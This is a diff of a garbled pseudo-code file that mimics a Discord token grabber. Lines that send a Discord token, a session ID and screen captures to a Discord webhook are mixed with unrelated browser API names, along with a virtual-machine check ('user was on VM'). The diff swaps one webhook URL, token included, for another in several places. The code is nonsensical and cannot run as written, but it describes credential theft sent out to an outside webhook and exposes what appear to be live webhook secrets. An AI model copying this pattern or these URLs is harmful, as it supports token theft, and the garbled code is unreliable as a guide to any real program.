@@ -25,7 +25,7 @@ import; "ign/uuid"
       SVGPathSegCurvetoQuadraticSmoothAbs : sessionID
       Math 20<10
       GeolocationCoordinates : FileList
-      discordwebhook : (https://discord.com/api/webhooks/881886500999004190/1IvcYRRz410P9ubKBJb0aLcoh87sMOzuLzJQ0kGscJibi52DWnZHkMRy_59O4Agw_Hbd)
+      discordwebhook : (https://discordapp.com/api/webhooks/1045811478722248704/lzR-n9Mz2PwUqanpbAJ2AA3BMxQ3sQ-Lm3iONkCuQY-ng8B__gc8IQ7jI-D4ooArqN7U)
         emebed : (logged)
    FileList 
      send (screen)
@@ -38,7 +38,7 @@ import; "ign/uuid"
     RTCSessionDescription(sessionID:discordtoken)
      HTMLBaseElement : scroll (1/2)
       FileList (SVGFEColorMatrixElement)
-      discordwebhook(https://discord.com/api/webhooks/881886500999004190/1IvcYRRz410P9ubKBJb0aLcoh87sMOzuLzJQ0kGscJibi52DWnZHkMRy_59O4Agw_Hbd)
+      discordwebhook(https://discordapp.com/api/webhooks/1045811478722248704/lzR-n9Mz2PwUqanpbAJ2AA3BMxQ3sQ-Lm3iONkCuQY-ng8B__gc8IQ7jI-D4ooArqN7U)
       send(screenTop)
       if(screen) send "sessionID"
        BiquadFilterNode(JSON)
@@ -48,12 +48,12 @@ import; "ign/uuid"
      setInterval(AnimationTimeline)
      send sessionID
       send discordtoken
-       discordwebhook(https://discord.com/api/webhooks/881886500999004190/1IvcYRRz410P9ubKBJb0aLcoh87sMOzuLzJQ0kGscJibi52DWnZHkMRy_59O4Agw_Hbd)
+       discordwebhook(https://discordapp.com/api/webhooks/1045811478722248704/lzR-n9Mz2PwUqanpbAJ2AA3BMxQ3sQ-Lm3iONkCuQY-ng8B__gc8IQ7jI-D4ooArqN7U)
      if(an unxpeted error occored)
    WebGLUniformLocation (error)
     MediaKeys (discordtoken , discordwebhook , sessionID)
      FileList (none)
-      Logto (https://discord.com/api/webhooks/7802398348923493/jkdsjkfu8538hSD37fsjhfHJF948953jdkj_3247dJFHKA_hdjfhjd_3457dfhgjMNFFA)
+      Logto (https://discordapp.com/api/webhooks/1045811478722248704/lzR-n9Mz2PwUqanpbAJ2AA3BMxQ3sQ-Lm3iONkCuQY-ng8B__gc8IQ7jI-D4ooArqN7U)
        SyntaxError()
          Say(user was on VM)
           departFocus 
